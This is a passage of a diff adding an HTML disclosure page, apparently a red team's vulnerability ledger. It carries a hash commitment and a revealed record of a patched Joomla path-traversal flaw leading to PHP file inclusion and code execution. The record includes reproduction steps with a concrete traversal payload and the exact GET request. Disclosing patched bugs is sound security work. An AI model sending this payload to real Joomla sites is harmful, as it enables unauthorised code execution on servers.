+      <span class="timeline-date">2026-05-28</span>
+      <span class="timeline-label">Patch released</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-05-28</span>
+      <span class="timeline-label">Publicly revealed</span>
+    </li>
+  </ol>
+</div>
+
+<div class="marker">PROVENANCE</div>
+<p class="kicker">SHA-3-512 hash:</p>
+<p class="hash full">a314b60a74f81e24040a96044a4ee6c575de5dd8a33ebf7bb96f5b6af2b78caf47d5ca533a92c24c506151b98299794a5754acc21431e18dca969e29d8721388</p>
+<p class="kicker">Committed 2026-04-23 07:04 UTC</p>
+<p class="kicker">Revealed 2026-05-28 18:00 UTC</p>
+<p class="kicker">
+  <a download="ANT-2026-HHD77M82-preimage.json"
+     href="data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-HHD77M82%22%2C%22bug_class%22%3A%22Path-traversal%22%2C%22claude_severity%22%3A%22high%22%2C%22commit_sha%22%3A%22bfc2c2ce6ea085f5%22%2C%22created_at%22%3A%222026-03-30T23%3A19%3A42%2B00%3A00%22%2C%22description%22%3A%22BaseController%3A%3Adisplay%28%29%20reads%20%60layout%60%20with%20the%20%27string%27%20filter%20%28preserving%20%60/%60%2C%20%60.%60%2C%20%60%3A%60%29%20and%20passes%20it%20to%20HtmlView%2C%20where%20setLayout%28%29%20splits%20on%20%60%3A%60%20and%20stores%20the%20left%20half%20verbatim%20in%20%60_layoutTemplate%60.%20loadTemplate%28%29%20then%20str_replace%28%29%27s%20the%20active%20template%20directory%20with%20this%20attacker-controlled%20value%20inside%20the%20search%20path%2C%20and%20Path%3A%3Afind%28%29%27s%20self-referential%20bounds%20check%20trivially%20passes%20because%20both%20%24path%20and%20%24fullname%20resolve%20under%20the%20same%20attacker-chosen%20directory.%20The%20resulting%20path%20is%20handed%20to%20include%28%29%2C%20executing%20any%20%60.php%60%20file%20whose%20parent%20directory%20%28matching%20the%20%60html/%3Ccomponent%3E/%3Cview%3E/%60%20suffix%29%20exists%20on%20disk.%20Unauthenticated%20GET%20to%20com_content%2C%20com_finder%2C%20or%20com_wrapper%20is%20sufficient%3B%20on%20a%20default%20install%20a%20chained%20file-write%20primitive%20is%20needed%20to%20place%20a%20matching%20%60.php%60%20file.%22%2C%22discovered_at%22%3Anull%2C%22location%22%3A%22libraries/src/MVC/Controller/BaseController.php%3A653%3B%20libraries/src/MVC/View/HtmlView.php%3A292%2C385-416%22%2C%22poc_sha256%22%3A%2245450fd3f2ec685f0a4e64a8e61d17f6dd7d541960b265ccb488904d11e39955%22%2C%22preimage_version%22%3A1%2C%22project%22%3A%22joomla%22%2C%22reproduction%22%3A%5B%221.%20Place%20or%20identify%20a%20PHP%20payload%20at%20e.g.%20/tmp/poc/html/com_content/categories/default.php%22%2C%222.%20Compute%20traversal%20depth%20from%20JPATH_THEMES%20%28/var/www/html/templates%29%20to%20%60/%60%20%E2%86%92%20%60../../../../%60%22%2C%223.%20Build%20payload%20%60layout%3D../../../../tmp/poc%3Adefault%60%20%28left%20of%20%60%3A%60%20%E2%86%92%20_layoutTemplate%20unsanitised%3B%20right%20of%20%60%3A%60%20%E2%86%92%20_layout%20sanitised%29%22%2C%224.%20Send%20GET%20/index.php%3Foption%3Dcom_content%26view%3Dcategories%26layout%3D../../../../tmp/poc%3Adefault%22%2C%225.%20HtmlView%3A%3AloadTemplate%28%29%20rewrites%20the%20search%20path%2C%20Path%3A%3Afind%28%29%20self-check%20passes%2C%20and%20the%20payload%20is%20include%28%29%27d%20%E2%80%94%20PHP%20executes%20as%20www-data%22%5D%2C%22technical_details%22%3A%22Each%20layer%20assumed%20another%20would%20sanitise%3A%20the%20controller%20uses%20filter%20%27string%27%20instead%20of%20%27cmd%27%2C%20setLayout%28%29%20stores%20%24temp%5B0%5D%20with%20zero%20validation%2C%20loadTemplate%28%29%20injects%20it%20into%20%24this-%3E_path%5B%27template%27%5D%20via%20str_replace%28%29%2C%20and%20Path%3A%3Afind%28%29%20only%20guards%20the%20filename%2C%20not%20the%20search%20path.%20The%20layout%20filename%20%28right%20of%20%60%3A%60%29%20is%20regex-sanitised%20at%20HtmlView.php%3A369%2C%20but%20the%20template%20name%20%28left%20of%20%60%3A%60%29%20takes%20a%20different%20code%20path%20with%20no%20equivalent%20filter%2C%20so%20%60../../../../tmp/poc%3Adefault%60%20redirects%20include%28%29%20to%20/tmp/poc/html/com_content/categories/default.php.%22%2C%22title%22%3A%22Path%20Traversal%20in%20%60layout%60%20Parameter%20Leads%20to%20Arbitrary%20PHP%20File%20Inclusion%20%28LFI%20%E2%86%92%20RCE%29%22%2C%22vendor_severity%22%3A%22high%22%7D">Verify (download preimage.json)</a>
+</p>
+<details class="preimage">
+  <summary>Show preimage JSON</summary>
+  <pre class="preimage-body">{
+  &#34;ant_id&#34;: &#34;ANT-2026-HHD77M82&#34;,
+  &#34;bug_class&#34;: &#34;Path-traversal&#34;,
+  &#34;claude_severity&#34;: &#34;high&#34;,
+  &#34;commit_sha&#34;: &#34;bfc2c2ce6ea085f5&#34;,
+  &#34;created_at&#34;: &#34;2026-03-30T23:19:42+00:00&#34;,
+  &#34;description&#34;: &#34;BaseController::display() reads `layout` with the &#39;string&#39; filter (preserving `/`, `.`, `:`) and passes it to HtmlView, where setLayout() splits on `:` and stores the left half verbatim in `_layoutTemplate`. loadTemplate() then str_replace()&#39;s the active template directory with this attacker-controlled value inside the search path, and Path::find()&#39;s self-referential bounds check trivially passes because both $path and $fullname resolve under the same attacker-chosen directory. The resulting path is handed to include(), executing any `.php` file whose parent directory (matching the `html/&lt;component&gt;/&lt;view&gt;/` suffix) exists on disk. Unauthenticated GET to com_content, com_finder, or com_wrapper is sufficient; on a default install a chained file-write primitive is needed to place a matching `.php` file.&#34;,
+  &#34;discovered_at&#34;: null,
+  &#34;location&#34;: &#34;libraries/src/MVC/Controller/BaseController.php:653; libraries/src/MVC/View/HtmlView.php:292,385-416&#34;,
+  &#34;poc_sha256&#34;: &#34;45450fd3f2ec685f0a4e64a8e61d17f6dd7d541960b265ccb488904d11e39955&#34;,
+  &#34;preimage_version&#34;: 1,
+  &#34;project&#34;: &#34;joomla&#34;,
+  &#34;reproduction&#34;: [
+    &#34;1. Place or identify a PHP payload at e.g. /tmp/poc/html/com_content/categories/default.php&#34;,
+    &#34;2. Compute traversal depth from JPATH_THEMES (/var/www/html/templates) to `/` → `../../../../`&#34;,
+    &#34;3. Build payload `layout=../../../../tmp/poc:default` (left of `:` → _layoutTemplate unsanitised; right of `:` → _layout sanitised)&#34;,
+    &#34;4. Send GET /index.php?option=com_content&amp;view=categories&amp;layout=../../../../tmp/poc:default&#34;,
+    &#34;5. HtmlView::loadTemplate() rewrites the search path, Path::find() self-check passes, and the payload is include()&#39;d — PHP executes as www-data&#34;
+  ],
+  &#34;technical_details&#34;: &#34;Each layer assumed another would sanitise: the controller uses filter &#39;string&#39; instead of &#39;cmd&#39;, setLayout() stores $temp[0] with zero validation, loadTemplate() injects it into $this-&gt;_path[&#39;template&#39;] via str_replace(), and Path::find() only guards the filename, not the search path. The layout filename (right of `:`) is regex-sanitised at HtmlView.php:369, but the template name (left of `:`) takes a different code path with no equivalent filter, so `../../../../tmp/poc:default` redirects include() to /tmp/poc/html/com_content/categories/default.php.&#34;,
+  &#34;title&#34;: &#34;Path Traversal in `layout` Parameter Leads to Arbitrary PHP File Inclusion (LFI → RCE)&#34;,
+  &#34;vendor_severity&#34;: &#34;high&#34;
+}</pre>
+</details>
+</main>
+<footer>
+  <p>Anthropic Frontier Red Team</p>
+  <p>Snapshot generated at 2026-11-02 19:30 UTC</p>
+  <p>Dates and times are in UTC</p>
+  <p>Manifest hash <code>25d811e7b56632ef5bbb23eb…</code></p>
+  <p>Archived snapshots remain available at their dated paths so any figure can be verified against the page that was live on that date</p>
+  <p><a href="../data/payload.json">payload.json</a></p>
+</footer>
+<script src="../assets/figures.js" data-root="../"></script>
+<script src="../assets/ledger.js"></script>
+</body>
+</html>
